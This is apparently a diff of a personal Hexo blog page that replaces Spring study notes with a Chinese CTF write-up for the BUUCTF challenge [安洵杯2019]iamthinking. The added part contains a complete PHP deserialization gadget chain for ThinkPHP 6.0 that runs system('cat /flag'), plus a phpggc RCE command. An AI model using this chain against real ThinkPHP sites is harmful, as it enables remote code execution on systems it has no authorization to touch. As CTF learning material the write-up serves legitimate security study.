@@ -24,13 +24,15 @@
 <link rel="stylesheet" href="/css/app.css?v=0.2.5">
 
   
+  <meta name="keywords" content="buuctf,thinkphpV6.0.0" />
 
-<link rel="canonical" href="http://odiws.github.io/2025/04/17/springweb/">
+
+<link rel="canonical" href="http://odiws.github.io/2024/09/23/%E5%AE%89%E6%B4%B5%E6%9D%AF2019-iamthinking/">
 
 
 
   <title>
-springweb |
+[安洵杯2019]iamthinking - 刷题笔记 |
 zty153’s_blog = Hexo</title>
 <meta name="generator" content="Hexo 7.3.0"></head>
 <body itemscope itemtype="http://schema.org/WebPage">
@@ -58,16 +60,16 @@ zty153’s_blog = Hexo</title>
         <div id="brand">
           <div class="pjax">
           
-  <h1 itemprop="name headline">springweb
+  <h1 itemprop="name headline">[安洵杯2019]iamthinking
   </h1>
   
 <div class="meta">
-  <span class="item" title="Created: 2025-04-17 20:43:47">
+  <span class="item" title="Created: 2024-09-23 15:32:41">
     <span class="icon">
       <i class="ic i-calendar"></i>
     </span>
     <span class="text">Posted on</span>
-    <time itemprop="dateCreated datePublished" datetime="2025-04-17T20:43:47+08:00">2025-04-17</time>
+    <time itemprop="dateCreated datePublished" datetime="2024-09-23T15:32:41+08:00">2024-09-23</time>
   </span>
 </div>
 
@@ -100,12 +102,12 @@ zty153’s_blog = Hexo</title>
       </div>
       <div id="imgs" class="pjax">
         <ul>
-          <li class="item" data-background-image="https://www.loliapi.com/acg/?21123"></li>
-          <li class="item" data-background-image="https://www.loliapi.com/acg/?101695"></li>
-          <li class="item" data-background-image="https://www.loliapi.com/acg/?359379"></li>
-          <li class="item" data-background-image="https://www.loliapi.com/acg/?326543"></li>
-          <li class="item" data-background-image="https://www.loliapi.com/acg/?674761"></li>
-          <li class="item" data-background-image="https://www.loliapi.com/acg/?919285"></li>
+          <li class="item" data-background-image="https://www.loliapi.com/acg/?144039"></li>
+          <li class="item" data-background-image="https://www.loliapi.com/acg/?390285"></li>
+          <li class="item" data-background-image="https://www.loliapi.com/acg/?854704"></li>
+          <li class="item" data-background-image="https://www.loliapi.com/acg/?103005"></li>
+          <li class="item" data-background-image="https://www.loliapi.com/acg/?193805"></li>
+          <li class="item" data-background-image="https://www.loliapi.com/acg/?140721"></li>
         </ul>
       </div>
     </header>
@@ -130,11 +132,13 @@ zty153’s_blog = Hexo</title>
     
 <div class="breadcrumb" itemscope itemtype="https://schema.org/BreadcrumbList">
 <i class="ic i-home"></i>
-<span><a href="/">Home</a></span>
+<span><a href="/">Home</a></span><i class="ic i-angle-right"></i>
+<span  class="current" itemprop="itemListElement" itemscope itemtype="https://schema.org/ListItem"><a href="/categories/%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0/" itemprop="item" rel="index" title="In 刷题笔记"><span itemprop="name">刷题笔记</span></a>
+<meta itemprop="position" content="1" /></span>
 </div>
 
     <article itemscope itemtype="http://schema.org/Article" class="post block" lang="en">
-  <link itemprop="mainEntityOfPage" href="http://odiws.github.io/2025/04/17/springweb/">
+  <link itemprop="mainEntityOfPage" href="http://odiws.github.io/2024/09/23/%E5%AE%89%E6%B4%B5%E6%9D%AF2019-iamthinking/">
 
   <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
     <meta itemprop="image" content="/images/avatar.jpg">
@@ -149,17 +153,69 @@ zty153’s_blog = Hexo</title>
   <div class="body md" itemprop="articleBody">
     
 
-    <h2 id="springweb开发学习笔记"><a class="anchor" href="#springweb开发学习笔记">#</a> Springweb 开发学习笔记</h2>
-<p>为什么要学习？</p>
-<p>简化开发；框架整合</p>
-<p>学什么？</p>
-<p>简化开发：</p>
-<p>IOC</p>
-<p>AOP-----&gt; 事务处理</p>
-<p>框架整合：</p>
-<p>MyBatis</p>
-<p>Mybatis-plus</p>
+    <h2 id="安洵杯-2019iamthinking"><a class="anchor" href="#安洵杯-2019iamthinking">#</a> [安洵杯 2019] iamthinking</h2>
+<h2 id="1"><a class="anchor" href="#1">#</a> <img data-src="https://zty--666.oss-cn-shanghai.aliyuncs.com/202503052005688.png" alt="1" /></h2>
+<p>dirsearch 搜集到 www.zip 文件：</p>
+<p>发现是 thinkphp6.0 版本：</p>
+<p>thinkphp6.0 有两个计较明显的漏洞：<br />
+一个文件上传：要开启 session（本题没开）</p>
+<p>一个就是反序列化：本体有个 unserilize 函数</p>
+<p>那就是反序列化了</p>
+<p>php 脚本：</p>
+<pre><code>&lt;?php
+ 
+namespace think\model\concern;
+ 
+trait Attribute
+&#123;
+    private $data = [&quot;key&quot; =&gt; [&quot;key1&quot; =&gt; &quot;cat /flag&quot;]];
+    private $withAttr = [&quot;key&quot;=&gt;[&quot;key1&quot;=&gt;&quot;system&quot;]];
+    protected $json = [&quot;key&quot;];
+&#125;
+namespace think;
+ 
+abstract class Model
+&#123;
+    use model\concern\Attribute;
+    private $lazySave;
+    protected $withEvent;
+    private $exists;
+    private $force;
+    protected $table;
+    protected $jsonAssoc;
+    function __construct($obj = '')
+    &#123;
+        $this-&gt;lazySave = true;
+        $this-&gt;withEvent = false;
+        $this-&gt;exists = true;
+        $this-&gt;force = true;
+        $this-&gt;table = $obj;
+        $this-&gt;jsonAssoc = true;
+    &#125;
+&#125;
+ 
+namespace think\model;
+ 
+use think\Model;
+ 
+class Pivot extends Model
+&#123;
+&#125;
+$a = new Pivot();
+$b = new Pivot($a);
+$c = array($b);
+echo urlencode(serialize($c));
+</code></pre>
+<p>phpgcc 好像搞不了（首字母不能是 O，在</p>
+<pre><code>./phpggc -u ThinkPHP/RCE2 'system(&quot;cat /flag&quot;);'
+</code></pre>
+<p>出来的时候是 O 开头）</p>
+<p>仔细的反序列化过程：<span class="exturl" data-url="aHR0cHM6Ly94ei5hbGl5dW4uY29tL3QvNjQ3OT91X2F0b2tlbj1lMTk4M2NjYTcxMTViYjczZGM4MjYxMzk1ZjM4ZTQyOCZhbXA7dV9hc2lnPTFhMGMzOTlhMTcyNzA3ODI1MzU5OTM0NzdlMDAzNQ==">https://xz.aliyun.com/t/6479?u_atoken=e1983cca7115bb73dc8261395f38e428&amp;u_asig=1a0c399a17270782535993477e0035</span></p>
 
+      <div class="tags">
+          <a href="/tags/buuctf/" rel="tag"><i class="ic i-tag"></i> buuctf</a>
+          <a href="/tags/thinkphpV6-0-0/" rel="tag"><i class="ic i-tag"></i> thinkphpV6.0.0</a>
+      </div>
   </div>
 
    <footer>
@@ -170,7 +226,7 @@ zty153’s_blog = Hexo</title>
       <i class="ic i-calendar-check"></i>
     </span>
     <span class="text">Edited on</span>
-    <time title="Modified: 2025-04-17 20:48:04" itemprop="dateModified" datetime="2025-04-17T20:48:04+08:00">2025-04-17</time>
+    <time title="Modified: 2025-03-05 20:05:17" itemprop="dateModified" datetime="2025-03-05T20:05:17+08:00">2025-03-05</time>
   </span>
 </div>
 
@@ -206,7 +262,7 @@ zty153’s_blog = Hexo</title>
   </li>
   <li class="link">
     <strong>Post link: </strong>
-    <a href="http://odiws.github.io/2025/04/17/springweb/" title="springweb">http://odiws.github.io/2025/04/17/springweb/</a>
+    <a href="http://odiws.github.io/2024/09/23/%E5%AE%89%E6%B4%B5%E6%9D%AF2019-iamthinking/" title="[安洵杯2019]iamthinking">http://odiws.github.io/2024/09/23/安洵杯2019-iamthinking/</a>
   </li>
   <li class="license">
     <strong>Copyright Notice:  </strong>All articles in this blog are licensed under <span class="exturl" data-url="aHR0cHM6Ly9jcmVhdGl2ZWNvbW1vbnMub3JnL2xpY2Vuc2VzL2J5LW5jLXNhLzQuMC9kZWVkLnpo"><i class="ic i-creative-commons"><em>(CC)</em></i>BY-NC-SA</span> unless stating additionally.
@@ -225,20 +281,20 @@ zty153’s_blog = Hexo</title>
     <div class="item left">
       
 
-  <a href="/2025/04/14/springboot-web/" itemprop="url" rel="prev" data-background-image="https:&#x2F;&#x2F;www.loliapi.com&#x2F;acg&#x2F;?37092" title="springboot_web">
+  <a href="/2024/07/29/ISITDTU2019-EasyPHP/" itemprop="url" rel="prev" data-background-image="https:&#x2F;&#x2F;www.loliapi.com&#x2F;acg&#x2F;?683794" title="[羊城杯2020]easyphp">
   <span class="type">Previous Post</span>
-  <span class="category"><i class="ic i-flag"></i> </span>
-  <h3>springboot_web</h3>
+  <span class="category"><i class="ic i-flag"></i> 刷题笔记</span>
+  <h3>[羊城杯2020]easyphp</h3>
   </a>
 
     </div>
     <div class="item right">
       
 
-  <a href="/2025/04/17/MyBatis/" itemprop="url" rel="next" data-background-image="https:&#x2F;&#x2F;www.loliapi.com&#x2F;acg&#x2F;?779720" title="MyBatis">
+  <a href="/2025/02/19/java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/" itemprop="url" rel="next" data-background-image="https:&#x2F;&#x2F;www.loliapi.com&#x2F;acg&#x2F;?426770" title="java反序列化学习笔记">
   <span class="type">Next Post</span>
-  <span class="category"><i class="ic i-flag"></i> </span>
-  <h3>MyBatis</h3>
+  <span class="category"><i class="ic i-flag"></i> 学习笔记</span>
+  <h3>java反序列化学习笔记</h3>
   </a>
 
     </div>
@@ -257,9 +313,12 @@ zty153’s_blog = Hexo</title>
   <div class="panels">
     <div class="inner">
       <div class="contents panel pjax" data-title="Contents">
-          <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#springweb%E5%BC%80%E5%8F%91%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0"><span class="toc-number">1.</span> <span class="toc-text"> Springweb 开发学习笔记</span></a></li></ol>
+          <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%AE%89%E6%B4%B5%E6%9D%AF-2019iamthinking"><span class="toc-number">1.</span> <span class="toc-text"> [安洵杯 2019] iamthinking</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#1"><span class="toc-number">2.</span> <span class="toc-text"> </span></a></li></ol>
       </div>
       <div class="related panel pjax" data-title="Related">
+        <ul>
+          <li><a href="/2024/04/28/3-txt/" rel="bookmark" title="buuctf4月27日">buuctf4月27日</a></li><li><a href="/2024/06/06/%5BRootersCTF2019%5DI_3_Flask/" rel="bookmark" title="'[RootersCTF2019]I_<3_Flask'">'[RootersCTF2019]I_<3_Flask'</a></li><li><a href="/2024/07/25/2019-Web-Unagi/" rel="bookmark" title="[CSAWQual2019]Web_Unagi">[CSAWQual2019]Web_Unagi</a></li><li><a href="/2024/07/28/2020-Greatphp/" rel="bookmark" title="[极客大挑战2020]Greatphp">[极客大挑战2020]Greatphp</a></li><li><a href="/2024/07/29/ISITDTU2019-EasyPHP/" rel="bookmark" title="[羊城杯2020]easyphp">[羊城杯2020]easyphp</a></li><li class="active"><a href="/2024/09/23/%E5%AE%89%E6%B4%B5%E6%9D%AF2019-iamthinking/" rel="bookmark" title="[安洵杯2019]iamthinking">[安洵杯2019]iamthinking</a></li><li><a href="/2025/02/26/HMGCTF2022-Fan-Website/" rel="bookmark" title="[HMGCTF2022]Fan_Website">[HMGCTF2022]Fan_Website</a></li><li><a href="/2025/03/11/GKCTF-2021-babycat-revenge/" rel="bookmark" title="[GKCTF_2021]babycat-revenge">[GKCTF_2021]babycat-revenge</a></li><li><a href="/2025/03/13/%E8%B0%81%E8%B5%A2%E4%BA%86%E6%AF%94%E8%B5%9B%EF%BC%9F/" rel="bookmark" title="谁赢了比赛？">谁赢了比赛？</a></li><li><a href="/2025/03/13/%E6%A2%85%E8%8A%B1%E9%A6%99%E8%87%AA%E8%8B%A6%E5%AF%92%E6%9D%A5/" rel="bookmark" title="梅花香自苦寒来">梅花香自苦寒来</a></li><li><a href="/2025/03/13/ACTF%E6%96%B0%E7%94%9F%E8%B5%9B2020-outguess/" rel="bookmark" title="[ACTF新生赛2020]outguess">[ACTF新生赛2020]outguess</a></li><li><a href="/2025/03/16/NewStarCTF-2023-%E5%85%AC%E5%BC%80%E8%B5%9B%E9%81%93-R-C-E/" rel="bookmark" title="[NewStarCTF-2023-公开赛道]R!!!C!!!E!!!">[NewStarCTF-2023-公开赛道]R!!!C!!!E!!!</a></li><li><a href="/2025/03/18/JMCTF-2021-GoOSS/" rel="bookmark" title="[JMCTF_2021]GoOSS">[JMCTF_2021]GoOSS</a></li>
+        </ul>
       </div>
       <div class="overview panel" data-title="Overview">
         <div class="author" itemprop="author" itemscope itemtype="http://schema.org/Person">
@@ -309,12 +368,12 @@ zty153’s_blog = Hexo</title>
 
   <ul id="quick">
     <li class="prev pjax">
-        <a href="/2025/04/14/springboot-web/" rel="prev" title="Previous Post"><i class="ic i-chevron-left"></i></a>
+        <a href="/2024/07/29/ISITDTU2019-EasyPHP/" rel="prev" title="Previous Post"><i class="ic i-chevron-left"></i></a>
     </li>
     <li class="up"><i class="ic i-arrow-up"></i></li>
     <li class="down"><i class="ic i-arrow-down"></i></li>
     <li class="next pjax">
-        <a href="/2025/04/17/MyBatis/" rel="next" title="Next Post"><i class="ic i-chevron-right"></i></a>
+        <a href="/2025/02/19/java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/" rel="next" title="Next Post"><i class="ic i-chevron-right"></i></a>
     </li>
     <li class="percent"></li>
   </ul>
@@ -336,44 +395,6 @@ zty153’s_blog = Hexo</title>
   <li class="item">
     
 <div class="breadcrumb">
-<a href="/categories/%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/" title="In 学习笔记">学习笔记</a>
-</div>
-
-    <span><a href="/2025/02/19/java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/" title="java反序列化学习笔记">java反序列化学习笔记</a></span>
-  </li>
-
-      
-  <li class="item">
-    
-<div class="breadcrumb">
-<a href="/categories/%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0/" title="In 刷题笔记">刷题笔记</a>
-</div>
-
-    <span><a href="/2025/03/11/GKCTF-2021-babycat-revenge/" title="[GKCTF_2021]babycat-revenge">[GKCTF_2021]babycat-revenge</a></span>
-  </li>
-
-      
-  <li class="item">
-    
-<div class="breadcrumb">
-</div>
-
-    <span><a href="/2025/07/08/java-sec-code%E5%A4%8D%E7%8E%B0/" title="java-sec-code复现">java-sec-code复现</a></span>
-  </li>
-
-      
-  <li class="item">
-    
-<div class="breadcrumb">
-</div>
-
-    <span><a href="/2025/04/07/http%E8%AF%B7%E6%B1%82%E8%B5%B0%E7%A7%81%E6%BC%8F%E6%B4%9E/" title="http请求走私漏洞">http请求走私漏洞</a></span>
-  </li>
-
-      
-  <li class="item">
-    
-<div class="breadcrumb">
 <a href="/categories/misc/" title="In misc">misc</a>
 </div>
 
@@ -384,10 +405,20 @@ zty153’s_blog = Hexo</title>
   <li class="item">
     
 <div class="breadcrumb">
+<a href="/categories/misc/" title="In misc">misc</a>
+</div>
+
+    <span><a href="/2025/05/06/SWPU2019-%E6%88%91%E6%9C%89%E4%B8%80%E5%8F%AA%E9%A9%AC%E9%87%8C%E5%A5%A5/" title="[SWPU2019]我有一只马里奥">[SWPU2019]我有一只马里奥</a></span>
+  </li>
+
+      
+  <li class="item">
+    
+<div class="breadcrumb">
 <a href="/categories/%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0/" title="In 刷题笔记">刷题笔记</a>
 </div>
 
-    <span><a href="/2024/04/28/3-txt/" title="buuctf4月27日">buuctf4月27日</a></span>
+    <span><a href="/2024/07/28/2020-Greatphp/" title="[极客大挑战2020]Greatphp">[极客大挑战2020]Greatphp</a></span>
   </li>
 
       
@@ -396,7 +427,7 @@ zty153’s_blog = Hexo</title>
 <div class="breadcrumb">
 </div>
 
-    <span><a href="/2025/04/14/springboot-web/" title="springboot_web">springboot_web</a></span>
+    <span><a href="/2025/05/21/sqltest/" title="sqltest">sqltest</a></span>
   </li>
 
       
@@ -413,10 +444,38 @@ zty153’s_blog = Hexo</title>
   <li class="item">
     
 <div class="breadcrumb">
-<a href="/categories/%E6%AF%94%E8%B5%9B%E5%A4%8D%E7%8E%B0/" title="In 比赛复现">比赛复现</a>
+<a href="/categories/misc/" title="In misc">misc</a>
 </div>
 
-    <span><a href="/2025/03/25/Nctf-web%E9%83%A8%E5%88%86%E5%A4%8D%E7%8E%B0/" title="Nctf_web部分复现">Nctf_web部分复现</a></span>
+    <span><a href="/2025/05/21/SWPU2019-%E4%BD%A0%E6%9C%89%E6%B2%A1%E6%9C%89%E5%A5%BD%E5%A5%BD%E7%9C%8B%E7%BD%91%E8%AF%BE/" title="[SWPU2019]你有没有好好看网课?">[SWPU2019]你有没有好好看网课?</a></span>
+  </li>
+
+      
+  <li class="item">
+    
+<div class="breadcrumb">
+</div>
+
+    <span><a href="/2025/04/17/MyBatis/" title="MyBatis">MyBatis</a></span>
+  </li>
+
+      
+  <li class="item">
+    
+<div class="breadcrumb">
+<a href="/categories/misc/" title="In misc">misc</a>
+</div>
+
+    <span><a href="/2025/05/06/MRCTF2020-ezmisc/" title="[MRCTF2020]ezmisc">[MRCTF2020]ezmisc</a></span>
+  </li>
+
+      
+  <li class="item">
+    
+<div class="breadcrumb">
+</div>
+
+    <span><a href="/2025/04/23/Spring-MVC/" title="Spring_MVC">Spring_MVC</a></span>
   </li>
 
       
@@ -426,7 +485,7 @@ zty153’s_blog = Hexo</title>
 <a href="/categories/%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0/" title="In 刷题笔记">刷题笔记</a>
 </div>
 
-    <span><a href="/2024/09/23/%E5%AE%89%E6%B4%B5%E6%9D%AF2019-iamthinking/" title="[安洵杯2019]iamthinking">[安洵杯2019]iamthinking</a></span>
+    <span><a href="/2025/03/13/%E8%B0%81%E8%B5%A2%E4%BA%86%E6%AF%94%E8%B5%9B%EF%BC%9F/" title="谁赢了比赛？">谁赢了比赛？</a></span>
   </li>
 
   </ul>
@@ -457,7 +516,7 @@ zty153’s_blog = Hexo</title>
   </div>
 <script data-config type="text/javascript">
   var LOCAL = {
-    path: '2025/04/17/springweb/',
+    path: '2024/09/23/安洵杯2019-iamthinking/',
     favicon: {
       show: "（●´3｀●）Goooood",
       hide: "(´Д｀)Booooom"
